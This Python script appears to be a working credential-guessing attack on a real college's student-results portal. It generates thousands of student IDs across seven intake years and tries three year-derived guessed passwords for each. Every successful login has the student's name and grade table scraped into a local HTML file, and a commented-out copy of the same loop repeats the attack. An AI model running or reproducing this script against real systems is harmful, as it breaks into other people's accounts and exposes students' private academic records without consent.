import requests,time,os,json,datetime

current_year = datetime.date.today().year

study_year = int(str(current_year)[2:]) 


students_list = []



for i in range(7):
    semester1 = str(study_year - (i)) + "1"
    semester2 = str(study_year - (i)) + "2"
    for j in range(400):
        students_list.append(semester1+"{:03d}".format(j))
        students_list.append(semester2+"{:03d}".format(j))


students_data = []



for i in students_list:
    year_of_registering = "20"+i[:2]
    students_data.append({"id":i,"pass1":"{:02d}".format(int(year_of_registering)-18),"pass2":"{:02d}".format(int(year_of_registering)-19),"pass3":"{:02d}".format(int(year_of_registering)-20)})






# reset the file
c = open("./h.html", "w")
c.write("")
c.close()



students_data2 = []


for i in range(len(students_data)):
    students_data2.append(students_data[i-len(students_data)])


counter = 0
f = open("./h.html", "a")
f.write("<!DOCTYPE html>")
f.close()
# fill the file with all the students grades
for i in students_data2:
    
    response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass1"]})
    if  response.text.find("<th>رمز المادة</th>") == -1:
        response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass2"]})
        if  response.text.find("<th>رمز المادة</th>") == -1:
             response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass3"]})
             if  response.text.find("<th>رمز المادة</th>") == -1:
                 continue
    
    print("graping " + i['id'])
    f = open("./h.html", "a")
    f.write("<br><br><br><br>")
    counter += 1
    f.write("\n<!-- tag with id"+i['id']+" -->\n")
    f.write("<h1>"+str(counter)+"</h1>\n")
    f.write("<h1>"+response.text[response.text.find(' <p class="pp">اسم الطالب:')+26:response.text.find(' </p>',response.text.find(' <p class="pp">اسم الطالب:'))]+"</h1>\n")
    f.write(i['id'])
    f.write(response.text[response.text.find('<table dir="rtl"  cellspacing="0" align="center"  >'):response.text.find('<tr><td colspan="3">المعدل الفصلي : ')])
    f.write("</table>")
    f.write("<br><br><br><br>")
    f.write("<hr><hr>")
    f.close()
    # print("got the data...")



	
# # fill the file with all the students grades
# for i in students_data:
#     print("graping " + i['id'])
#     response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass1"]})
#     if response.text.find("اسم الطالب:"):
#         text = response.text[response.text.find('<table dir="rtl"  cellspacing="0" align="center"  >'):response.text.find('<tr><td colspan="3">المعدل الفصلي : ')]
#         f = open("./h.html", "a")
#         f.write(response.text[response.text.find(' <p class="pp">اسم الطالب:')+26:response.text.find(' </p>',response.text.find(' <p class="pp">اسم الطالب:'))])
#         f.write(text)
#         f.close()
#         print("got the data...")
       
#     else:
#         response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass2"]}) 
#         if response.text.find("اسم الطالب:"):
#             text = response.text[response.text.find('<table dir="rtl"  cellspacing="0" align="center"  >'):response.text.find('<tr><td colspan="3">المعدل الفصلي : ')]
#             f = open("./h.html", "a")
#             f.write(response.text[response.text.find(' <p class="pp">اسم الطالب:')+26:response.text.find(' </p>',response.text.find(' <p class="pp">اسم الطالب:'))])
#             f.write(text)
#             f.close()
#             print("got the data...")
#         else:      
#             response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass3"]})
#             if response.text.find("اسم الطالب:"):
#                 text = response.text[response.text.find('<table dir="rtl"  cellspacing="0" align="center"  >'):response.text.find('<tr><td colspan="3">المعدل الفصلي : ')]
#                 f = open("./h.html", "a")
#                 f.write(response.text[response.text.find(' <p class="pp">اسم الطالب:')+26:response.text.find(' </p>',response.text.find(' <p class="pp">اسم الطالب:'))])
#                 f.write(text)
#                 f.close()
#                 print("got the data...")
#             else:
#                 print("nothing here")
